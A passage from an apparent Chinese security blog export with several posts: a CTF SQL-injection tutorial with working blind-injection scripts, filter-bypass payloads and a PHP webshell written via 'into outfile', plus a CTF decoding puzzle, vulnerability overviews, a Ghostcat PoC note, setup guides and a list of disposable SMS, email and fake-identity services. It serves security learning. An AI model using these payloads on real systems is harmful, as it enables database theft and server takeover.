面对布尔盲注，我们想要获取自己想知道的信息时，需要判断信息的每一位的ASCII码，对于返回的信息是否正确，直接观察页面的返回正常与否即可,虽然可以手动判断，但是花费时间过长，但是我使用常规的盲注脚本发现没有出现正常结果。到and 1=1和and 1=2返回的都是success，所以我们使用if(expr1,expr2,expr3)函数来盲注具体脚本 import requests url='http://challenge-b4f28550822194be.sandbox.ctfhub.com:10080/?id=' for i in range(0,4): #0-3,假设四条记录，第i条开始 name='' for j in range(0,10): for k in '0123456789zaqwsxedcrfvtgbyhnujmikolp_':#判断字符 test_url=url+ 'if (substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1) =\"%s\", 1,(select table_name from information_schema.tables) )' %(i,j,k) #分别是第i条记录，第j个字符，k字符 print(test_url) rep=requests.get(test_url) if 'query_success' in rep.text: name=name+k break print(name) 得到表名 1.3.4 时间盲注在?id=1 后面添加 and sleep(10)这个延迟时间测试是否有时间盲注的时候设长一点，因为是手动测试是否有漏洞，为了避免网络的原因让我们漏掉漏洞，sleep(10)之后可以看到网站有明显的延迟，证明时间盲注存在时间盲注会用到sleep(time)函数，还有if函数if(1,2,3)：如果1真，则执行2，否则执行3Sleep(x)：执行延迟x秒先判断数据库的长度和数据库名称具体脚本 import requests import time import string import sys headers = {\"user-agent\":\"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)\"} chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.' database = '' global length for l in range(1,20): lengthUrl = 'http://challenge-c13b65fc664e2e69.sandbox.ctfhub.com:10080/? +'id=1 and if(length(database())&gt;{0},1,sleep(3))--+' lengthUrlFormat = lengthUrl.format(l) #判断数据长度 start_time0 = time.time()#获取时间 rsp0 = requests.get(lengthUrlFormat,headers=headers) if time.time() - start_time0 &gt; 2.5: print 'database length is ' + str(l) global length length = l break else: pass for i in range(1,length+1): #根据长度来弄出名 for char in chars: #chars是所有字符 anbcd... charAscii = ord(char) #全部大写 url = 'http://challenge-c13b65fc664e2e69.sandbox.ctfhub.com:10080/?id=1 +'and if(ascii(substr(database(),{0},1))&gt;{1},1,sleep(3))--+' urlformat = url.format(i,charAscii) #名的第i个字符，与某个字符比较 start_time = time.time() rsp = requests.get(urlformat,headers=headers)#访问 if time.time() - start_time &gt; 2.5: database+=char print 'database: ',database break else: pass print 'database is ' + database 1.3.5 二次注入二次注入是因为数据在第一次进入数据库的时候进行了过滤和转义当这条数据从数据取出来在sql语句中进行拼接，而这次拼接中没有过滤一般比较难发现，所以比赛中很难发现，一般CTF出题人会给源码，或者提示二次注入也一般不是单纯的二次注入，通常还有报错注入或bool盲注，要写脚本模拟 2、找到漏洞再谈一谈怎么发现注入点常见的注入点位置有 GET参数的注入 这个最容易发现，就是参数在url中，如www.ex1t.com?id=1 POST参数的注入 这个需要通过抓包，使用burp或者浏览器插件hackbar等 User-Agent的注入 使用Burp的Repeater模块（重发器）当然，以上都可以使用sqlmap来测试。 一般注入点都发生在常进行数据变动的地方，比如进行数据查询 然后再判断是否有注入 1.输入单引号 最常见检测，让sql语句产生单引号未闭合错误 注入类型判断 and 1=1(数字型) 和 ‘and ‘1’=’1(字符串)和 %’ and ‘%’=’(搜索型)进行判断 通过数字加减来判断是不是整数型 id=3-1结果和id=2结果是否一样。日常中常用的还是单引号，and，or 3、绕过过滤通常会有以下方式防Sql注入 3.1 过滤关键词3.1.1 过滤select、or、from等关键字有些题目是将关键词替换为空，这时候能使用穿插关键字方法绕过那可以通过双写，大小写绕过 双写 selselectect –&gt; select oorr –&gt; or 大小写 SeLect Or 3.1.2 如果只是过滤了or and xor not等等 and = &amp;&amp; or = || xor = | # 异或 not = ! 3.1.3 有时候过滤函数是通过十六进制进行过滤。可以对关键字的个别字符进行替换 select --&amp;gt; selec\\x74 有时候通过双重URL编码进行绕过操作 %25%36%66%25%37%32 --&amp;gt; %6f%72 --&amp;gt; or 还有内联注释绕过内联注释就是把一些特有的仅在MYSQL上的语句放在 /!…/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。mysql&amp;gt; select * from users where id = -1 union /*!select*/ 1,2,3; 3.2 过滤空格3.2.1 通过注释绕过，一般的注释符有如下几个 # --// /**/ ;%00 可以通过注释符来绕过空格 select/**/name/**/from/**/user 3.2.2 通过URL编码绕过，我们知道空格%20，所以可以通过二次URL编码进行绕过%20 --&gt; %2520 3.2.3 通过空白字符绕过，各个数据库都有一些空白字符MySQL5--09,0A,0B,0C,0D,A0,20 3.2.4 通过特殊字符（如括号，反引号等）select(user()) 3.2.5 科学计数法绕过select user,password from users where user_id=0e1union select 1,2 3.3 过滤单引号过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为\\ ' 。 id=-1%df%27union select 1,user(),3--+ 在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路： %df 吃掉 \\ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面： 将 ' 中的 \\ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。 %df%27=====(addslashes)======&gt;%df%5c%27======(GBK)======&gt;運’ id=-1%df%27union select 1,user(),3--+ 3.4 过滤等号使用like 、rlike 、regexp 或者 使用比较符（） 3.5 过滤逗号可以使用join方法绕过 union select 1,2,3 join语句： union select * from (select 1)a join (select 2)b join (select 3) 3.6 过滤比较符（）使用greatest()、least（）：（前者返回最大值，后者返回最小值） 3.7 过滤注释符（#,–）id=1' union select 1,2,3||'1 最后的or ‘1闭合查询语句的最后的单引号，或者： id=1' union select 1,2,'3 3.8 进行编码绕过 如URLEncode编码，ASCII,HEX,unicode编码绕过： or 1=1 %6f%72%20%31%3d%31 CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。 4 SQL读写文件在了解SQL注入的原理、方法、过滤之后 继续学习一下SQL读写文件 CTF中有的flag在文件中，但是存在SQL注入，渗透过程中，你也可以写入木马文件 在具有file权限的情况下，使用load_file和into outfile/dumpfile进行读写 读取文件 ?id=-1+union+select+load_file('/etc/hosts') 在某些绕过单引号的情况下，可以使用文件名的十六进制来作为load_file函数的参数 ?id=-1+union+select+load_file(0x2f6574632f686f737473) 也可以通过sql写文件 ?id=-1+union+select+’&lt;?php eval($_POST[-7]);&gt;‘+into+outfile'/var/www/html/shell.php' 或 ?id=-1+union+select+unhex(一句话shell的十六进制)+into+dumpfile'/var/www/html/shell.php' 值得注意的是，除了要有写文件的权限，文件名不能是已存在的. 5 总结就此关于SQL注入的总结已经完成了，最近在看CTF特训营，顿时发觉自己学的还很浅，于是觉得该好好的总结一次。除了CTF特训营上的内容，还有以前浏览网上各大博主发表的wp、总结等所记录的笔记，学会了很多。如果本文存在错误或有其他问题以及还存在补充，敬请指正。","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://k3vi-07.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"诚默"},{"title":"一题python加密题","slug":"一题python加密题","date":"2020-07-08T02:49:00.000Z","updated":"2023-01-10T07:57:11.691Z","comments":true,"path":"2020/07/08/一题python加密题/","link":"","permalink":"https://k3vi-07.github.io/2020/07/08/%E4%B8%80%E9%A2%98python%E5%8A%A0%E5%AF%86%E9%A2%98/","excerpt":"之前做ctf过程中遇到了一个使用python写写的加密程序.","text":"之前做ctf过程中遇到了一个使用python写写的加密程序. 加密过程源码import base64 def encode1(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x + 25 s += chr(x) return s def encode2(ans): s = '' for i in ans: x = ord(i) + 36 x = x ^ 36 s += chr(x) return s def encode3(ans): return base64.b32encode(ans) flag = ' ' print 'Please Input your flag:' flag = raw_input() final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' if encode3(encode2(encode1(flag))) == final: print 'correct' else: print 'wrong' 解密算法源码import base64 final = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===' def decode3(ans): s = base64.b32decode(ans) return s def decode2(ans): s = '' for i in ans: x = ord(i) ^ 36 x = x - 36 s += chr(x) return s def decode1(ans): s = '' for i in ans: x = ord(i) - 25 x = x ^ 36 s += chr(x) return s th = decode3(final) print(th) se = decode2(th) print(se) fr = decode1(se) print(fr)","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://k3vi-07.github.io/tags/python/"},{"name":"Ctf","slug":"ctf","permalink":"https://k3vi-07.github.io/tags/ctf/"}],"author":"k3vi"},{"title":"mac下安装frida报错解决方法","slug":"mac下安装frida报错解决方法","date":"2020-05-12T05:09:00.000Z","updated":"2023-01-10T07:57:46.518Z","comments":true,"path":"2020/05/12/mac下安装frida报错解决方法/","link":"","permalink":"https://k3vi-07.github.io/2020/05/12/mac%E4%B8%8B%E5%AE%89%E8%A3%85frida%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/","excerpt":"mac下安装frida报错解决方法报错截图","text":"mac下安装frida报错解决方法报错截图 ssl的原因解决方法 sudo /Applications/Python\\ 3.7/Install\\ Certificates.command 之后执行安装就可以了","categories":[],"tags":[],"author":"k3vi"},{"title":"常见漏洞描述","slug":"常见漏洞简述","date":"2020-05-09T02:49:00.000Z","updated":"2023-01-10T07:56:14.262Z","comments":true,"path":"2020/05/09/常见漏洞简述/","link":"","permalink":"https://k3vi-07.github.io/2020/05/09/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/","excerpt":"漏洞主要分为XSS注入、SQL注入、服务漏洞、文件上传、命令执行、文件包含、csrf、ssrf、反序列化等 （1）XSS注入XSS攻击是通过注入恶意代码到用户浏览器的网页上，从而达到劫持用户回话的目的 危害网络钓鱼，包括盗取各类的用户账号 窃取用户cookie 窃取用户浏览请回话 强制弹出广告页面、刷流量 网络挂马 提升用户权限，进一步渗透网站 传播跨站脚本等","text":"漏洞主要分为XSS注入、SQL注入、服务漏洞、文件上传、命令执行、文件包含、csrf、ssrf、反序列化等 （1）XSS注入XSS攻击是通过注入恶意代码到用户浏览器的网页上，从而达到劫持用户回话的目的 危害网络钓鱼，包括盗取各类的用户账号 窃取用户cookie 窃取用户浏览请回话 强制弹出广告页面、刷流量 网络挂马 提升用户权限，进一步渗透网站 传播跨站脚本等 分类（1）存储型：存储型保存到服务器上，只要访问这个页面就会触发，然后可以盗取信息。 （2）反射型：也称作非持久型、参数型跨站脚本，非持久化,需要欺骗用户自己去点击链接才能触发XSS代码。 （3）DOM型：这种类型则是利用非法输入来闭合对应的html标签。 出现原因如在个人信息或发表文章等地方,加入代码,如果没有过滤或过滤不严,那么这些代码将储存到服务器中,用户访问该页面的时候触发代码执行 防范措施1、过滤恶意代码 2、待补充 实战-XSS挑战 [http://test.ctf8.com/](http://test.ctf8.com/ \"http://test.ctf8.com/\") (2) SQL注入SQL注入是再web应用程序中事先定义好的查询语句添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询。 危害数据库信息泄漏 数据库被恶意操作 分类根据后台数据库类型分类-不同的数据库注入语句有所不同 Mysql：免费的，适用于中小型网站 。 SQL Server：微软的一个关系型数据库，适用于中大型网站 。 Oracle：支持多用户，大事务量的处理，适用于中大型网站 。 Access：微软开发的一个小型数据库，适用于小网站。 待补充 根据注入方式分类 整数型注入 字符型注入 报错注入 布尔注入 时间盲注 待补充 分类方式待补充 出现原因程序开发过程中不注意书写规范，对sql语句和关键字未进行过滤，导致客户端可以通过全局变量get或者post提交sql语句到服务器端正常运行; 个人理解：对用户查询的语句未进行限制，导致用户采用拼接的方式来进行对数据库的恶意操作。 防范措施拒绝已知的不良输入，即建立黑名单库 接受已知的正常输入，即建立白名单库 净化数据，对可能存在的恶意字符进行编码或转义 后台使用正确的代码 语法检查 实战ctfhub.com 技能树/web/sql注入 (3) 服务漏洞待补充 (4) 文件上传漏洞由于开发则在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件: 危害导致网站甚至整个服务器被控制 分类任意文件上传 后缀大小写绕过 文件类型绕过 双写后缀名绕过 请求特殊后缀绕过 图片木马合并上传 文件00截断绕过 待补充 出现原因对上传的文件未进行严格的检测。 防范措施1. 检查文件上传路径 2. 文件扩展名检测 3. 文件 MIME验证 4. 文件内容检测 5. 图片二次渲染 6. 文件重命名 待补充 实战ctfhub.com 技能树/web/文件上传 (5) 命令执行漏洞应用在调用函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。 危害导致网站甚至整个服务器被控制 出现原因对于用户的输入未进行严格的检测 防范措施1. 关闭此功能 2. 对用户输入进行过滤 3. 限制输入格式 待补充 实战github.com 技能树/RCE/命令注入 (6) 文件包含漏洞服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码 危害导致网站甚至整个服务器被控制 分类本地文件包含,当被包含的文件在服务器本地时，就形成本地文件包含远程文件包含RFI,当被包含的文件在第三方服务器时，叫做远程文件包含。 出现原因文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 防范措施1.PHP 中使用 open_basedir 配置限制访问在指定的区域 2.过滤.（点）/（反斜杠）\\（反斜杠） 3.禁止服务器远程文件包含 待补充 实战ctfhub.com /技能树/RCE/文件包含 (7) csrf一种劫持受信任用户向服务器发送非预期请求的攻击方式。 危害盗用用户身份，进行操作，涉及个人隐私和个人财产安全 分类请求类型来区分。 GET类型 POST类型 按照攻击类型分类， HTML CSRF攻击， JSOM HiJacking攻击 FIash CSRF攻击 待补充 出现原因请求所有的参数均可确定 请求的审核不严格，如：只验证了Cookie 防范措施1.使用Token（随机的值）验证 2.判断请求的Referer头是否为正常的发送请求的页面 3.使用验证码 待补充 实战待补充 (8) ssrf一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人） 危害盗用用户身份，进行操作，涉及个人隐私和个人财产安全 分类待补充 出现原因服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。具体待补充 防范措施1.禁止跳转 2.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 3.禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 4.设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 5.限制请求的端口为http常用的端口，比如 80、443、8080、8090 6.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 待补充 实战待补充 (9) 反序列化序列化是将运行时变量和程序对象转换成可以存储或传输的形式的过程。反序列化是将序列化形式转换回内存变量和程序对象的相反过程。序列化形式可以是基于文本的格式，例如JSON或XML，或二进制格式。许多高级的语言（如C＃，Java和PHP）都内置了对数据序列化的支持。 危害黑客可以利用它进行拒绝服务攻击、访问控制攻击和远程命令执行攻击。 分类Java反序列化 Python反序列化 PHP反序列化 等 出现原因序列化和反序列化本身并不存在问题。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。 防范措施1.进行完整性验证 待补充 实战待补充 漏洞待补充 如有错误，敬请指正。","categories":[],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"https://k3vi-07.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"诚默"},{"title":"匿名邮箱、临时邮箱、短信平台","slug":"匿名邮箱、免费临时邮箱、免费短信接码平台","date":"2020-04-21T08:51:00.000Z","updated":"2023-01-10T07:56:48.109Z","comments":true,"path":"2020/04/21/匿名邮箱、免费临时邮箱、免费短信接码平台/","link":"","permalink":"https://k3vi-07.github.io/2020/04/21/%E5%8C%BF%E5%90%8D%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1%E3%80%81%E5%85%8D%E8%B4%B9%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B9%B3%E5%8F%B0/","excerpt":"匿名邮箱、临时邮箱、短信平台 匿名个人身份信息生成器https://www.fakenamegenerator.com/ Generate a Random Name - Fake Name Generator 国外的一个随机匿名身份信息生成器，可以生成一套包括姓名、性别、年龄、国家、身份证号、银行卡号、电话号码、邮箱地址、身高、体重、血型、车辆信息等的匿名身份资料，比较实用。","text":"匿名邮箱、临时邮箱、短信平台 匿名个人身份信息生成器https://www.fakenamegenerator.com/ Generate a Random Name - Fake Name Generator 国外的一个随机匿名身份信息生成器，可以生成一套包括姓名、性别、年龄、国家、身份证号、银行卡号、电话号码、邮箱地址、身高、体重、血型、车辆信息等的匿名身份资料，比较实用。 http://www.haoweichi.com/ 国外随机身份信息生成器，可以生成美国、加拿大、日本、澳大利亚等身份信息，中文 可以完全匿名注册的电子邮箱 邮箱服务 网址 ProtonMail https://protonmail.com/ mail.com https://www.mail.com/ 临时、一次性、匿名邮箱 网址 简介 http://24mail.chacuo.net/ 临时电子邮箱,十分钟邮箱(10分钟),临时邮,临时Email,快速注册Email,24小时邮箱 http://www.yopmail.com/ YOPmail 临时、匿名的免费邮箱地址。 https://10minutemail.net/ 10分钟邮箱: 安全免费的一次性临时电邮地址 https://10minutemail.org/ 10分钟邮箱: 安全免费的一次性临时电邮地址 https://linshiyou.com/ 临时邮箱,10分钟邮箱,24小时邮箱 https://www.guerrillamail.com/ Guerrilla Mail - Disposable Temporary E-Mail Address 提示：ProtonMail 人机验证可用 guerrillamail.org 后缀。 https://www.moakt.com/ Moakt Email 临时邮箱专业服务 https://temp-mail.org/ Temp Mail - Disposable Temporary Email 支持中文，有安卓和ios客户端 http://www.fakemailgenerator.com/ Fake Mail Generator - Free temporary email addresses https://tempail.com/ - https://mail-temp.com/ - https://tempm.com/ - 国内手机号、短信验证码平台 网址 简介 http://www.smszk.com/ 在线短信验证码接收，手机验证码短信接收平台，最好用的免费云短信网站！ https://sms.cm/ 云短信 - 免费在线短信接收，国内免费临时手机号 https://sms.cngrok.com/receiving-sms/ 短信码上到-掠影网络，国内临时接码的 https://www.becmd.com/ 免费接码 - 免费短信验证码接收平台 https://www.pdflibr.com/ 云短信 - 在线短信接收 中国,美国,菲律宾 https://yunduanxin.net/ 免费接短信,在线接收短信验证码 - 云短信帮助您从世界任何地方接收手机短信 http://www.z-sms.com/ 在线云短信 https://www.materialtools.com/ 云短信-在线短信接收 http://www.xnsms.com/ 免费接码平台 https://www.smsbo.com/ Receive SMS Online 国外手机号、短信验证码平台 网址 简介 接收地区 http://hs3x.com/ Receive SMS Online For Free - Free Virtual Numbers 美国,英国,奥地利,瑞典,比利时 http://receivefreesms.com/ Receive FREE SMS online 美国,英国,挪威,瑞典,荷兰,澳大利亚,匈牙利,立陶宛,中国香港等 http://receivefreesms.net/ Receive-SMS-Now 美国,加拿大,西班牙 http://receiveonlinesms.biz/ Receive Online SMS 美国,瑞典,挪威,西班牙,英国 http://receiveonlinesms.com/ Receive SMS Online 国外免费临时手机号 http://receive-sms-online.com/ Receive SMS Online 俄国,英国,乌克兰 http://receivesmsonline.in/ Receive SMS Online 美国,加拿大,西班牙 http://receivesmsverification.com/ Receive SMS 比利时,英国,美国 http://sms.sellaite.com/ SELLAITE 爱沙尼亚 http://www.freesmsverifications.com/ Receive Free SMS 美国,英国,法国,波兰,比利时,加拿大 http://www.receive-sms-now.com/ Receive-SMS-Now 美国,加拿大,荷兰 http://www.shejiinn.com/ 免费接码, 短信验证码,在线接收短信,接码平台 中国,缅甸,美国 http://z-sms.com/ Z-SMS 中国,美国,缅甸,爱沙尼亚 https://ch.freephonenum.com/ FreePhonenum 国外免费临时手机号（中文） 美国,加拿大(支持免费发短信) https://receive-a-sms.com/ Receive a SMS Online 美国,澳大利亚,挪威,奥地利,巴西,中国香港,南非,波兰,英国,加拿大 https://receive-sms.com/ Receive-SMS 美国 https://smsnumbersonline.com/ Free SMS Numbers Online 美国,英国,加拿大,波兰 https://sms-online.co/receive-free-sms/ Receive SMS online for Free 美国,英国,加拿大,瑞典,法国,马来西亚,印度尼西亚 https://sms-receive.net/ SMS-Receive 俄罗斯,法国,罗马尼亚,西班牙,荷兰,英国 https://smsreceivefree.com/ SMSReceiveFree 美国,英国,加拿大 https://www.freeonlinephone.org/ Free Online Phone - 美国,加拿大,英国,瑞典 https://www.pinger.com/text-free/ Textfree - https://www.receivesms.co/ Receive SMS Online 美国,奥地利,比利时,加拿大,瑞士,丹麦,西班牙,英国,意大利,波兰,葡萄牙,瑞典等 https://www.receivesms.net/ Receive SMS Online - 国外免费临时手机号 - https://www.receive-sms-online.info/ Receive SMS Online for FREE 英国,罗马尼亚,美国,西班牙,法国,德国,俄罗斯 https://www.receivesmsonline.net/ RECEIVE SMS ONLINE 美国,加拿大,英国 https://www.textnow.com/ TextNow 美国 https://www.twilio.com/ Twilio - 用于SMS，语音，视频和身份验证的通信API。支持API调用，看上去很不错。 - https://zh.mytrashmobile.com/ MyTrashmobile 美国,英国,加拿大 https://www.zusms.com/ 在线免费短信接收平台 中国香港、美国、加拿大、中国","categories":[],"tags":[{"name":"工具","slug":"工具","permalink":"https://k3vi-07.github.io/tags/%E5%B7%A5%E5%85%B7/"}],"author":"k3vi"},{"title":"在windows10-wsl下以图形化运行kali-linux","slug":"在windows10-wsl下以图形化运行kali-linux","date":"2020-03-10T05:59:00.000Z","updated":"2021-01-03T23:00:53.083Z","comments":true,"path":"2020/03/10/在windows10-wsl下以图形化运行kali-linux/","link":"","permalink":"https://k3vi-07.github.io/2020/03/10/%E5%9C%A8windows10-wsl%E4%B8%8B%E4%BB%A5%E5%9B%BE%E5%BD%A2%E5%8C%96%E8%BF%90%E8%A1%8Ckali-linux/","excerpt":"","text":"要想在Windows下不使用虚拟机运行Linux，首先需要了解的知识点是到底wsl和xfce是什么东西 什么是wslWindows Subsystem for Linux（简称WSL）是一个在Windows 10上能够运行原生Linux二进制可执行文件（ELF格式）的兼容层。简单点说，也就是Windows下的现有的Linux子系统。 什么是XfceXfce是独立的软件组件构成，可根据需要单独使用或者组合在一起提供计算机图形桌面环境的全面功能，它提供轻量级桌面环境。它明显的优点为快速、轻量、界面美观和对用户友好。 所以，本篇文章将对安装过程进行详细讲述。 安装过程预先配置系统设置（1）打开子系统功能（2）打开Microsoft store下载ubuntu由于我的电脑打不开应用商店，所以才有的本次操作，勾选这两个才可以打??应用商店。（如果您可以，请忽略此步） （3）下载Ubuntu 下载成功之后启动ubuntu终端中sudo su可以切换到root权限 配置wsl(1)配置源如果没有配置源，使用apt-get命令安装软件时常常会失败编辑配置源vim /etc/apt/sources.list #添加阿里源 deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse 保存后更新源apt-get updateapt-get upgrade时间会比较长 （2）下载xfceapt install xfce4apt install xfce4-session 安装完之后需要稍微配置一下 export DISPLAY=localhost:0这个只是临时的环境变量配置，每次启动wsl都要配置一下，我们可以将其写到文件中，就不需要每次都重新配置了。echo “export DISPLAY=:0.0”&gt;&gt; ~/.bashrc或者echo “export DISPLAY=localhost:0”&gt;&gt; ~/.bashrc （3）启动桌面打开这里我选的最后一个，然后一路next之后就是什么都没有的灰色界面，不用管，在wsl下输入命令xfce4-session若会出现如下图所示，则表明安装成功 安装成之后就可以在xfce桌面中进行美化、安装工具等等，相比于VM十分方便快捷。 借用上述安装方法安装和运行kali linux由于这又是一个新下载的子系统，所以同样的需要配置源，配置wslsudo vim /etc/apt/sources.list&gt;这次我添加的是中科大的源deb https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src https://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib 然后步骤相同，更新源，下载xfce4，最后打开XLaunch 在wsl中输入xfce4-session使得在xfce中可以运行kali linux子系统。如图所示，xfce可以运行任何你所拥有的子系统。 当然了，在这个桌面里同样可以实现其他在kali上实现的功能，总之，xfce桌面就是又强大又便捷，你值得拥有。?","categories":[],"tags":[{"name":"kali","slug":"kali","permalink":"https://k3vi-07.github.io/tags/kali/"},{"name":"wsl","slug":"wsl","permalink":"https://k3vi-07.github.io/tags/wsl/"}],"author":"ex1t"},{"title":"CNVD-2020-10487漏洞利用及POC","slug":"cnvd-2020-10487漏洞利用及poc","date":"2020-02-22T12:56:00.000Z","updated":"2023-01-10T07:57:29.123Z","comments":true,"path":"2020/02/22/cnvd-2020-10487漏洞利用及poc/","link":"","permalink":"https://k3vi-07.github.io/2020/02/22/cnvd-2020-10487%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%8F%8Apoc/","excerpt":"TOMCAT 简介Apache Tomcat 是一个免费的开源 Web 应用服务器，在中小型企业和个人开发用户中有着广泛的应用。 漏洞起因Apache Tomcat 中会默认开启一个为ajp的服务（默认端口8009），此服务的主要是使用二进制格式来传输可读性文本，换言之就是用来读取文件的。然而此服务中存在一处缺陷导致可以读取web目录下的文件，或者进行文件包含。","text":"TOMCAT 简介Apache Tomcat 是一个免费的开源 Web 应用服务器，在中小型企业和个人开发用户中有着广泛的应用。 漏洞起因Apache Tomcat 中会默认开启一个为ajp的服务（默认端口8009），此服务的主要是使用二进制格式来传输可读性文本，换言之就是用来读取文件的。然而此服务中存在一处缺陷导致可以读取web目录下的文件，或者进行文件包含。 漏洞编号CNVD-2020-10487CVE-2020-1938 影响范围 Apache Tomcat 6 Apache Tomcat 7 &lt; 7.0.100 Apache Tomcat 8 &lt; 8.5.51 Apache Tomcat 9 &lt; 9.0.31 漏洞利用 POC收集https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/https://github.com/0nise/CVE-2020-1938 扩展看到有大牛利用文件上传功能上传webshell，配合此漏洞进行rce操作。","categories":[],"tags":[{"name":"poc","slug":"poc","permalink":"https://k3vi-07.github.io/tags/poc/"},{"name":"漏洞","slug":"漏洞","permalink":"https://k3vi-07.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"author":"k3vi"},{"title":"在VMware 15下安装kali 2019.4，并进行相关配置配置","slug":"在vmware-15下安装kali-2019-4，并进行相关配置配置","date":"2020-02-18T01:03:00.000Z","updated":"2023-01-10T07:57:22.268Z","comments":true,"path":"2020/02/18/在vmware-15下安装kali-2019-4，并进行相关配置配置/","link":"","permalink":"https://k3vi-07.github.io/2020/02/18/%E5%9C%A8vmware-15%E4%B8%8B%E5%AE%89%E8%A3%85kali-2019-4%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E9%85%8D%E7%BD%AE/","excerpt":"在VMware 15下安装kali 2019.4，并进行相关配置，安装vmware-tools、配置国内源、进行更新 准备工作 镜像地址：http://mirrors.163.com/kali-images/kali-2019.4/kali-linux-2019.4-gnome-amd64.iso","text":"在VMware 15下安装kali 2019.4，并进行相关配置，安装vmware-tools、配置国内源、进行更新 准备工作 镜像地址：http://mirrors.163.com/kali-images/kali-2019.4/kali-linux-2019.4-gnome-amd64.iso 虚拟机版本： vmware 15，下载地址：https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.5.1-15018445.exe 虚拟机资源配置要求 硬盘：60G 内存：大于等于2G CPU：2核心，并在硬件中开启VT UEFI模式，非传统bios 安装过程参考kali 2020.1安装教程和上课视频 KALI安装过程 虚拟机配置部分略，参考上诉内容 具体安装过程 选择Start installer进行安装 选择语言 选择地区 配置键盘 配置主机名，如kali2019 配置域，建议为空 配置密码，建议按照自己的使用习惯配置，或者直接配置成toor方便记忆 磁盘分区，选择（向导-使用整个磁盘） 配置分区，选择（将所有文件放在同一分区中）配置软件包管理器，如果网络不好建议选择否，安装过程中网络断开会造成安装失败 包管理自动配置过程中，如果无法配置成功，此时要进行如下操作，跳过包管理器的配置 安装结束重启 配置虚拟机 安装vmware tools 拷贝文件VMwareTools-*tar.gz到下载文件夹。 在下载文件夹空白处右击–&gt; 在此处打开命令行，使用命令tar -zxvf VMwareTools-*.tar.gz,之后你回在下载文件夹中看到 执行如下命令，进入文件夹vmware-tools-distrib，并执行安装程序，之后一路回车到底cd vmware-tools-distrib ./vmware-install.pl 看到如下画面安装成功![图片上传中…] 配置apt源 使用命令编辑文件 gedit /etc/apt/sources.list 添加如下内容到文件中，deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib 更新软件源并更新软件,通过更新将操作系统软件更新到最新。 apt update -y apt upgrade -y --fix-missing 